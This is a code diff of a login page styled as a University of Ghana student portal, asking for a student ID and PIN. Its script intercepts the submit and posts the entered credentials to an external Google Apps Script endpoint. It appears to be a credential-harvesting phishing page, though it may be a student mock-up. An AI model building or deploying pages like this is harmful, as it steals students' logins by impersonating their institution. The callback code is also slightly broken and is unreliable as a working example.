@@ -28,18 +28,33 @@
 </head>
 <body>
 
+
+
 <div class="logincontain ">
 <div class="box ">
     <div class="form ">
+        <!-- spinner -->
+        <div class="lds-roller">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <!-- spinner -->
             <!--left-->
             <div class="loginleft col-sm-12 " >
                 <div class="logincontainer col-sm-12">
                     <img src="assets/img/University_of_Ghana.png">
                     <h2>log in </h2>
-                    <form method="GET" action="./home.html" name="Login">
-                        <input type="text" name="username" placeholder="STUDENT ID" required>
-                        <input type="password" name="password" placeholder="PIN" required>
-                        <input type="submit" name="login" value="Log in">
+                    <form name="login">
+                        <input type="text" name="username" placeholder="STUDENT ID"  required>
+                        <input type="password" name="password" placeholder="PIN"  required>
+                        <!-- <input type="submit" value="Log in"> -->
+                        <button type="submit"> log in</button>
                         
                     </form>
                 </div>
@@ -50,24 +65,27 @@
 
 </div>
 
+
+
+
 </body>
 
 
 
 <script>
-
+//$(".lds-roller").hide()
 
   const script_url = 'https://script.google.com/macros/s/AKfycbw2Wxjgd_iwoYJNckpWoPZpO3W3OIGWjiwhsVfcn0zM6zW9GCBd4H82jzmguuwc7Cbo/exec'
-  const studentLogin = document.forms['Login']
-
-  studentLogin.addEventListener('submit', e => {
+  const Login = document.forms['login']
+  Login.addEventListener('submit', e => {
     e.preventDefault()
-    fetch(script_url, { method: 'POST', body: new FormData(Login)})
+    fetch(script_url, { method: 'post', body: new FormData(Login)})
        .then(function(){
         response => console.log('Success!', response);
-        window.location.replace("home.html")
-
-       })
+        console.log('fired')
+        //window.location.replace("home.html")
+       }
+       )
       .catch(error => console.error('Error!', error.message))
     
   })
